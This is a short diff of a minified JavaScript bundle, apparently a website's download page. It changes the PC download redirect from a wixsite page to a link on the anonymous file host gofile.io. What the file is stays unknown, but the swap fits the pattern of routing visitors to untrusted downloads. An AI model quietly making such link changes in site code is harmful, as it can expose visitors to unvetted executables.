@@ -13557,7 +13557,7 @@ const Gv = () => {
     const e = i => {
         const o = {
             android: "https://sulnifahutabarat29.wixsite.com/my-site",
-            pc: "https://sulnifahutabarat29.wixsite.com/my-site"
+            pc: "https://gofile.io/d/2Cnq7d"
         };
         window.location.href = o[i]
     }
@@ -13907,3 +13907,4 @@ Ff(document.getElementById("root")).render(v.jsx(_.StrictMode, {
         router: bv
     })
 }));
+
